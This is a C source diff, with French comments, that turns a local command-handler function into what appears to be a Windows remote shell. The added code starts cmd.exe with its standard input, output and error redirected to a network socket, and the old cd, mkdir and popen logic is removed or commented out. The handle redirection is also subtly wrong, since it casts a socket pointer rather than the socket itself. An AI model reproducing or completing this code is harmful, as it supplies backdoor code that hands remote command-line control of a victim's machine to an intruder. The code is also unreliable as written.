@@ -5,92 +5,43 @@
 
 #include "shell.h"
 
-
-char* shellcommand(char* command )
+#include <winsock2.h>
+#pragma comment(lib, "ws2_32.lib")
+char* shellcommand(char* command, SOCKET* socket)
 {
   printf("test du shell... : \n");
   FILE *fp;
   char path[1035];
   char buffer[10000];       // Buffer
   char* finalOutput = NULL; // Final result
-  char* commandSplitted;   // Command splitted to check if cd
-  char* commandSplittedArray[2];
   char currentDirectory[100];
   memset(path,0,1035);      // reset to 0 path
   memset(buffer,0,10000);  // reset to 0 buffer
   memset(currentDirectory,0,100);  // reset to 0 currentDirectory
 
-  int i =0;
+//test de  create process
+    STARTUPINFO sui;
+    PROCESS_INFORMATION pi;
 
-  /**
-  Spliting command to see if there is change directory (cd)
-  **/
-  commandSplitted = strtok (command," ,.-");
-  while (commandSplitted != NULL)
-  {
-    commandSplittedArray[i] = commandSplitted;
-    commandSplitted = strtok (NULL, " ");
-    i++;
-  }
-  //Setting current direcorty
-  getcwd(currentDirectory,100);
-  printf("Current Working Directory : %s\n",currentDirectory);
-  /***
-  * If changing directory
-  ***/
-  if (strcmp(commandSplittedArray[0],"cd") == 0){
-    printf("%s\n", "on passe dans la command cd");
-    if(chdir(commandSplittedArray[1]) == -1){
-       printf( "Unable to locate the directory: %s\n", *commandSplittedArray[1]);
-    }else{
-        printf("Current Working Directory : %s\n",currentDirectory);
+    memset(&sui,0, sizeof(sui));
+    sui.cb = sizeof(sui);
+    sui.dwFlags =(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    sui.hStdInput=sui.hStdOutput = sui.hStdError =(HANDLE)socket;
+
+    char* cmdline = "cmd.exe";
+    if(!CreateProcess(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)){
+        printf("CreateProcess failes (%d).\n", GetLastError());
     }
 
-     finalOutput = malloc((strlen(currentDirectory))*sizeof(char));
-     if(finalOutput == NULL){
-       printf("%s\n", "Failed to allocate memory");
-      exit(0);
-     }
-     strcpy(finalOutput,currentDirectory);
-     printf("Final output (path): %s \n", finalOutput);
-
-  }
-
-  /***
-  * If creating  a directory
-  ***/
-
-  else if(strcmp(commandSplittedArray[0],"mkdir") == 0){
-      printf("%s\n", "on passe dans la command mkdir\n");
-        printf("le nom du dossier a creer est : %s\n", commandSplittedArray[1]) ;
-       char str[] = "Hello World";
-        char *result = (char *)malloc(strlen(str)+1);
-        int index=0;
-        while(index <= strlen(str))
-        {
-        result[index] = str[index];
-        index++;
-        }
-
-        //strcpy(test,*commandSplittedArray[1]);
-      int n=mkdir(result);
-      if(n==0)
-      printf("Directory Created\n");
-      else
-      printf("Unable to Create a Directory\n");
-
-  }
-
-
    /* Open the command for reading. */
-  else{
+ /** else{
       fp = popen(command, "r");
       if (fp == NULL) {
         printf("Failed to run command\n" );
         exit(1);
       }
       else {
-        /* Read the output a line at a time - output it. */
+        // Read the output a line at a time - output it.
         while (fgets(path, sizeof(path)-1, fp) != NULL) {
           printf("%s", path);
           strcat(buffer,path);
@@ -110,10 +61,10 @@ char* shellcommand(char* command )
 
      }
 
-      /* close */
+      // close
       pclose(fp);
     }
-
+**/
   if (finalOutput == NULL){
     printf("%s\n", "finalOutput is NULL");
     return "NULL\n";
